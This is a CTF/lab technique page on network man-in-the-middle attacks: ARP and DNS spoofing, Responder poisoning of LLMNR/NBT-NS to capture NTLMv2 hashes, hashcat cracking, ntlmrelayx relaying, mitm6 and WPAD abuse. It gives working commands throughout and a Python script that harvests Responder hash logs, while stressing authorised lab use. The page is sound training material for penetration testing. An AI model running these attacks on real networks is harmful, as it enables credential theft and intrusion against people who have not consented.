---
title: "MITM on a CTF Network - ARP/DNS Spoofing and LLMNR Poisoning"
category: misc
subcategory: network-services
type: technique
tags: [mitm, arp-spoofing, dns-spoofing, responder, llmnr-poisoning, mitm6, bettercap, ettercap, ntlm-relay, hashcat, tcpdump, network-services]
difficulty: medium
summary: "On a lab/CTF LAN: ARP-spoof to intercept traffic, DNS-spoof to redirect names, and poison LLMNR/NBT-NS/mDNS with Responder to capture NTLM hashes."
when_to_use:
  - "You are on the same layer-2 segment as the target(s) on a lab/CTF network"
  - "Windows hosts are broadcasting name-resolution requests (LLMNR/NBT-NS)"
  - "You want to capture NTLM hashes or relay coerced authentication"
  - "You need to redirect a victim's DNS or intercept cleartext traffic"
tools: [responder, mitm6, bettercap, ettercap, arpspoof, tcpdump, impacket, hashcat]
related: [ad-credential-attacks, net-pivoting-tunnelling, net-dns-attacks]
---

## TL;DR

On a shared layer-2 segment you can sit between hosts. ARP spoofing redirects traffic through you;
DNS spoofing answers name lookups with your IP; Responder poisons the Windows fallback name
protocols (LLMNR/NBT-NS/mDNS) to capture NTLMv2 hashes. mitm6 does the IPv6 equivalent and pairs
with ntlmrelayx. **Lab and CTF networks only.**

## Recognise it

- You have a shell/box on the same subnet as other targets (attack-defense, AD lab, HTB pro-lab).
- Windows hosts issue LLMNR (UDP 5355) / NBT-NS (UDP 137) / mDNS (UDP 5353) queries -- visible in a
  capture.
- SMB signing is disabled on some hosts (relay is viable).

## Attack

### Enable forwarding first

```bash
# Turn on IP forwarding so intercepted traffic still reaches its destination (no DoS)
sudo sysctl -w net.ipv4.ip_forward=1
```

### ARP spoofing

```bash
# Find the gateway and the victim
ip route | grep default
sudo arp-scan --localnet          # or: nmap -sn 10.10.10.0/24

# arpspoof both directions (poison victim and gateway)
sudo arpspoof -i tun0 -t 10.10.10.20 10.10.10.1     # tell victim we are the gateway
sudo arpspoof -i tun0 -t 10.10.10.1 10.10.10.20     # tell gateway we are the victim

# bettercap: ARP spoof the whole subnet from its interactive console
sudo bettercap -iface eth0
#   > set arp.spoof.targets 10.10.10.20
#   > arp.spoof on
#   > net.sniff on

# ettercap graphical/text MITM
sudo ettercap -T -i eth0 -M arp:remote /10.10.10.1// /10.10.10.20//
```

Capture the redirected traffic:

```bash
# Sniff the victim's traffic passing through you
sudo tcpdump -i tun0 -w mitm.pcap host 10.10.10.20

# Live look for cleartext creds
sudo tcpdump -i tun0 -A host 10.10.10.20 and \(port 21 or port 80 or port 110 or port 143\)
```

### DNS spoofing

```bash
# ettercap DNS spoof: edit /etc/ettercap/etter.dns with A records, e.g.
#   target.ctf   A   10.10.10.9
#   *.ctf        A   10.10.10.9
sudo ettercap -T -i eth0 -P dns_spoof -M arp:remote /10.10.10.1// /10.10.10.20//

# bettercap dns.spoof
sudo bettercap -iface eth0
#   > set dns.spoof.domains target.ctf,*.ctf
#   > set dns.spoof.address 10.10.10.9
#   > dns.spoof on
#   > arp.spoof on

# dnsmasq as a rogue resolver (if you can make the victim use you for DNS)
# /etc/dnsmasq.conf:  address=/target.ctf/10.10.10.9
sudo dnsmasq -d -C /etc/dnsmasq.conf
```

### Responder - LLMNR/NBT-NS/mDNS poisoning

When a Windows host fails DNS, it broadcasts LLMNR/NBT-NS; Responder answers "that's me" and
captures the NTLMv2 authentication that follows.

```bash
# Poison and serve rogue authenticators; -w WPAD, -v verbose
sudo responder -I tun0 -wv

# Analyze mode: watch what is being requested WITHOUT poisoning (recon, safe)
sudo responder -I tun0 -A

# Captured hashes land here
ls /usr/share/responder/logs/
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.10.20.txt
```

Crack the captured NTLMv2:

```bash
# NTLMv2 (the usual capture) = hashcat mode 5600
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# NTLMv1 (rare, only if the client is downgraded) = hashcat mode 5500
hashcat -m 5500 ntlmv1.txt rockyou.txt
```

### Responder + ntlmrelayx (relay instead of crack)

To relay, turn off Responder's own SMB and HTTP servers so ntlmrelayx can bind them.

```bash
# Edit /usr/share/responder/Responder.conf:  SMB = Off   HTTP = Off
sudo responder -I tun0 -wv

# Find hosts with signing disabled (relay targets)
netexec smb 10.10.10.0/24 --gen-relay-list relay-targets.txt

# Relay captured auth to those hosts and run a command / dump SAM
ntlmrelayx.py -tf relay-targets.txt -smb2support -c 'whoami'

# Relay to LDAP to edit ACLs / set up RBCD
ntlmrelayx.py -t ldaps://10.10.10.5 --escalate-user jdoe

# SOCKS mode keeps each relayed session for interactive use
ntlmrelayx.py -tf relay-targets.txt -smb2support -socks
```

### mitm6 - IPv6 DNS takeover

Windows prefers IPv6 and asks for a DHCPv6 lease constantly. mitm6 answers, becomes the victim's
DNS server, and hands its queries to ntlmrelayx.

```bash
# Become the IPv6 DNS server for the domain
sudo mitm6 -d corp.local

# Relay the resulting authentication to LDAP over IPv6; -wh serves a rogue WPAD
ntlmrelayx.py -6 -t ldaps://dc01.corp.local -wh fakewpad.corp.local --delegate-access
```

### WPAD abuse

If clients auto-detect a proxy (WPAD), Responder/mitm6 serve a rogue `wpad.dat`, then every HTTP
request routes through you and prompts for NTLM auth -- more hashes, or a relay opportunity.

### TLS interception caveats

```bash
# mitmproxy as a transparent proxy (after redirecting the victim's traffic to you)
mitmproxy --mode transparent --showhost
```

`sslstrip` and TLS interception are largely defeated by HSTS and cert pinning on modern clients;
in CTF they still work against apps that speak plain HTTP or ignore cert warnings.

## Code

Responder-log harvester: scoop all captured NTLMv2 hashes into one dedup'd file and print the exact
hashcat command.

```python
#!/usr/bin/env python3
"""Collect unique NTLMv2 hashes from Responder logs and emit the hashcat command.

Usage:
    python3 responder_loot.py [/usr/share/responder/logs]
"""
from __future__ import annotations

import glob
import os
import sys

DEFAULT_LOGDIR = "/usr/share/responder/logs"


def collect(logdir: str) -> list[str]:
    """Return unique NTLMv2 hash lines from the SMB/HTTP capture files."""
    seen: set[str] = set()
    ordered: list[str] = []
    for path in glob.glob(os.path.join(logdir, "*NTLMv2*.txt")):
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                for line in fh:
                    line = line.strip()
                    # dedupe by account name (field before the first ::)
                    if "::" not in line:
                        continue
                    account = line.split("::", 1)[0].lower()
                    if account in seen:
                        continue
                    seen.add(account)
                    ordered.append(line)
        except OSError:
            continue
    return ordered


def main(argv: list[str]) -> int:
    logdir = argv[1] if len(argv) > 1 else DEFAULT_LOGDIR
    hashes = collect(logdir)
    if not hashes:
        print(f"[-] no NTLMv2 hashes found in {logdir}")
        return 0
    out = "captured_ntlmv2.txt"
    with open(out, "w", encoding="utf-8") as fh:
        fh.write("\n".join(hashes) + "\n")
    print(f"[+] {len(hashes)} unique hash(es) -> {out}")
    print(f"    hashcat -m 5600 {out} rockyou.txt -r /usr/share/hashcat/rules/best64.rule")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **Scope.** ARP/DNS spoofing affects everyone on the segment. Only do this on lab/CTF networks you
  are authorised to attack -- never a shared or production LAN.
- **Enable IP forwarding** or you black-hole the victim's traffic (a DoS, and it tips them off).
- **Responder relay conflict.** SMB and HTTP must be `Off` in Responder.conf before ntlmrelayx can
  bind those ports.
- **Signing kills relay.** `--gen-relay-list` gives only the hosts you can actually relay to.
- **NTLMv2 vs NTLMv1** -- you almost always capture v2 (mode 5600). v1 (5500) only appears if the
  client is downgraded, which you may be able to force via LM/NTLM downgrade settings.
- **mitm6 is aggressive** -- it can disrupt the whole subnet's IPv6; run it only as long as needed.
- **Machine account hashes** captured via Responder are usually uncrackable (random 120-char
  passwords) -- relay them instead of cracking.
- **HSTS/pinning** defeat sslstrip against real sites; expect it to work only on lax CTF apps.

## Tools

- `responder` -- LLMNR/NBT-NS/mDNS poisoning, hash capture, analyze mode.
- `mitm6` -- IPv6 DHCPv6/DNS takeover.
- `bettercap`, `ettercap`, `arpspoof` -- ARP/DNS spoofing.
- `impacket` `ntlmrelayx.py` -- relay captured authentication.
- `tcpdump` / `wireshark` -- capture intercepted traffic.
- `hashcat` (5600 NTLMv2, 5500 NTLMv1) -- crack captured hashes.
- `mitmproxy` -- HTTP/S interception.

## References

- RFC 826 (ARP), RFC 4795 (LLMNR), RFC 6762 (mDNS).
- The Responder and mitm6 README files shipped with each tool.
- The impacket `ntlmrelayx.py -h` help for relay targets and options.
